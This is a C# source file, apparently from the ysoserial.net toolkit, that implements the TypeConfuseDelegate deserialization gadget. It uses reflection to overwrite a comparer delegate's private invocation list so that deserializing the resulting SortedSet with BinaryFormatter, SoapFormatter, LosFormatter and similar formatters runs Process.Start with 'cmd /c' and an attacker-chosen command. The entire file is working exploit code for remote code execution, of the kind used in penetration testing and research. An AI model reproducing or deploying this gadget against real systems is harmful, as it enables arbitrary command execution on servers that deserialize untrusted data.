using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;

namespace ysoserial.Generators
{
    class TypeConfuseDelegateGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TypeConfuseDelegate";
        }

        public override string Description()
        {
            return "TypeConfuseDelegate gadget by James Forshaw";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override Boolean IsSupported(string formatter)
        {
            var formatters = SupportedFormatters();
            var lowercased = formatters.Select(x => x.ToLower()).ToList();
            if (lowercased.Contains(formatter.ToLower())) return true;
            else return false;
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + cmd);

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return Serialize(set, formatter, test);
        }

    }
}
